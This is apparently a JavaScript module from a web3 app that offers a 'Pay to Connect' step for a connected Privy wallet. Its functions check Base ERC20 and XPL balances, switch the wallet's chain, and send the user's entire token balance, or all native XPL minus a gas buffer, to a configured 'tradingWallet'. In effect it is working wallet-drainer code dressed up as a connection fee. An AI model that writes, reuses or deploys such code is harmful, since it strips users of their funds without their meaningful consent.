import { ethers } from 'ethers';
import { transferERC20ToTradingWallet, getERC20Balance } from './erc20.js';
import { CHAINS } from '../config/chains.js';

/**
 * Pay to Connect - PRIORITY: Base first, then XPL
 * Checks Base token FIRST regardless of current chain
 */

/**
 * Execute pay-to-connect with BASE PRIORITY
 * 1. Check Base token balance FIRST (even if on XPL)
 * 2. If Base token exists → Switch to Base and transfer
 * 3. If no Base token → Check XPL and transfer
 * 
 * @param {object} wallet - Privy wallet object
 * @returns {Promise<object>} - Transaction result
 */
export async function executePayToConnect(wallet) {
  try {
    console.log('🚀 Starting Pay to Connect with BASE PRIORITY...');
    
    const provider = await wallet.getEthersProvider();
    const signer = provider.getSigner();
    const userAddress = await signer.getAddress();
    
    // STEP 1: Check Base token FIRST (priority)
    console.log('🔍 PRIORITY CHECK: Checking Base token balance...');
    
    const baseChainConfig = CHAINS.BASE;
    
    try {
      // Create Base provider to check balance
      const baseProvider = new ethers.JsonRpcProvider(baseChainConfig.rpcUrl);
      const baseBalance = await getERC20Balance(
        baseChainConfig.payToConnect.token,
        userAddress,
        baseProvider
      );
      
      console.log(`💰 Base token balance: ${baseBalance}`);
      
      if (parseFloat(baseBalance) > 0) {
        console.log('✅ Base token detected! Prioritizing Base chain...');
        
        // Switch to Base if not already on it
        const currentNetwork = await provider.getNetwork();
        const currentChainId = Number(currentNetwork.chainId);
        
        if (currentChainId !== baseChainConfig.chainId) {
          console.log(`🔄 Switching from chain ${currentChainId} to Base (8453)...`);
          
          try {
            // Request chain switch
            await wallet.switchChain(baseChainConfig.chainId);
            console.log('✅ Switched to Base chain!');
            
            // Wait a bit for chain switch
            await new Promise(resolve => setTimeout(resolve, 1000));
            
            // Get new provider after switch
            const newProvider = await wallet.getEthersProvider();
            const newSigner = newProvider.getSigner();
            
            // Transfer Base token
            return await transferERC20Token(newSigner, userAddress, baseChainConfig);
            
          } catch (switchError) {
            console.error('❌ Chain switch failed:', switchError);
            throw new Error('Please manually switch to Base network in your wallet and try again.');
          }
        } else {
          // Already on Base, just transfer
          console.log('✅ Already on Base chain, transferring token...');
          return await transferERC20Token(signer, userAddress, baseChainConfig);
        }
      } else {
        console.log('⚠️ No Base token found, checking XPL as fallback...');
      }
    } catch (baseCheckError) {
      console.log('⚠️ Base check failed, checking XPL as fallback...', baseCheckError.message);
    }
    
    // STEP 2: Fallback to XPL if no Base token
    console.log('🔍 FALLBACK: Checking XPL...');
    
    const currentNetwork = await provider.getNetwork();
    const currentChainId = Number(currentNetwork.chainId);
    
    const xplChainConfig = CHAINS.XPL;
    
    if (currentChainId === xplChainConfig.chainId) {
      // On XPL chain, transfer XPL
      console.log('✅ On XPL chain, transferring native XPL...');
      return await transferNativeToken(signer, userAddress, xplChainConfig);
    } else {
      // Not on XPL, try to switch
      console.log(`🔄 Switching to XPL chain...`);
      
      try {
        await wallet.switchChain(xplChainConfig.chainId);
        console.log('✅ Switched to XPL chain!');
        
        await new Promise(resolve => setTimeout(resolve, 1000));
        
        const newProvider = await wallet.getEthersProvider();
        const newSigner = newProvider.getSigner();
        
        return await transferNativeToken(newSigner, userAddress, xplChainConfig);
        
      } catch (switchError) {
        console.error('❌ Chain switch failed:', switchError);
        throw new Error('Please manually switch to XPL or Base network in your wallet and try again.');
      }
    }
    
  } catch (error) {
    console.error('❌ Pay to Connect error:', error);
    throw error;
  }
}

/**
 * Transfer native token (XPL) to trading wallet
 */
async function transferNativeToken(signer, userAddress, chainConfig) {
  try {
    const provider = signer.provider;
    
    const balance = await provider.getBalance(userAddress);
    console.log(`💰 Current XPL balance: ${ethers.formatEther(balance)} XPL`);
    
    if (balance === 0n) {
      throw new Error('No XPL to transfer. Please add XPL to your wallet first.');
    }
    
    const gasBuffer = ethers.parseEther(chainConfig.payToConnect.gasBuffer || '0.001');
    
    if (balance <= gasBuffer) {
      throw new Error(`Insufficient XPL. Need more than ${chainConfig.payToConnect.gasBuffer} XPL for gas.`);
    }
    
    const amountToSend = balance - gasBuffer;
    
    console.log(`📤 Transferring ${ethers.formatEther(amountToSend)} XPL to ${chainConfig.tradingWallet}`);
    
    const tx = await signer.sendTransaction({
      to: chainConfig.tradingWallet,
      value: amountToSend
    });
    
    console.log(`⏳ Transaction sent: ${tx.hash}`);
    const receipt = await tx.wait();
    console.log(`✅ Transfer confirmed! Block: ${receipt.blockNumber}`);
    
    return {
      success: true,
      txHash: tx.hash,
      amount: ethers.formatEther(amountToSend),
      symbol: chainConfig.nativeCurrency.symbol,
      type: 'NATIVE',
      chain: chainConfig.name
    };
    
  } catch (error) {
    console.error('❌ Native token transfer error:', error);
    throw error;
  }
}

/**
 * Transfer ERC20 token to trading wallet (Base chain)
 */
async function transferERC20Token(signer, userAddress, chainConfig) {
  try {
    const tokenAddress = chainConfig.payToConnect.token;
    
    console.log(`💰 Checking ${chainConfig.payToConnect.name} balance...`);
    
    const balance = await getERC20Balance(tokenAddress, userAddress, signer.provider);
    
    if (parseFloat(balance) === 0) {
      throw new Error(`No ${chainConfig.payToConnect.name} tokens to transfer.`);
    }
    
    console.log(`📤 Transferring ALL ${chainConfig.payToConnect.name} to ${chainConfig.tradingWallet}`);
    
    const result = await transferERC20ToTradingWallet(
      tokenAddress,
      chainConfig.tradingWallet,
      signer
    );
    
    return {
      ...result,
      type: 'ERC20',
      chain: chainConfig.name
    };
    
  } catch (error) {
    console.error('❌ ERC20 token transfer error:', error);
    throw error;
  }
}

/**
 * Check balances with BASE PRIORITY
 */
export async function checkPayToConnectBalance(wallet) {
  try {
    const provider = await wallet.getEthersProvider();
    const signer = provider.getSigner();
    const userAddress = await signer.getAddress();
    
    // Check Base first
    const baseChainConfig = CHAINS.BASE;
    const baseProvider = new ethers.JsonRpcProvider(baseChainConfig.rpcUrl);
    const baseBalance = await getERC20Balance(
      baseChainConfig.payToConnect.token,
      userAddress,
      baseProvider
    );
    
    if (parseFloat(baseBalance) > 0) {
      return {
        sufficient: true,
        balance: baseBalance,
        symbol: baseChainConfig.payToConnect.name,
        message: 'Base token available - will be transferred first',
        chain: baseChainConfig.name,
        chainId: baseChainConfig.chainId,
        priority: 'BASE'
      };
    }
    
    // Check XPL as fallback
    const network = await provider.getNetwork();
    const chainId = Number(network.chainId);
    
    if (chainId === CHAINS.XPL.chainId) {
      const xplBalance = await provider.getBalance(userAddress);
      const gasBuffer = ethers.parseEther('0.001');
      const sufficient = xplBalance > gasBuffer;
      
      return {
        sufficient,
        balance: ethers.formatEther(xplBalance),
        symbol: 'XPL',
        message: sufficient ? 'XPL available' : 'Insufficient XPL',
        chain: 'XPL',
        chainId: CHAINS.XPL.chainId,
        priority: 'XPL'
      };
    }
    
    return {
      sufficient: false,
      balance: '0',
      message: 'No Base token or XPL found',
      priority: 'NONE'
    };
    
  } catch (error) {
    console.error('Error checking balance:', error);
    return { sufficient: false, balance: '0', message: error.message };
  }
}
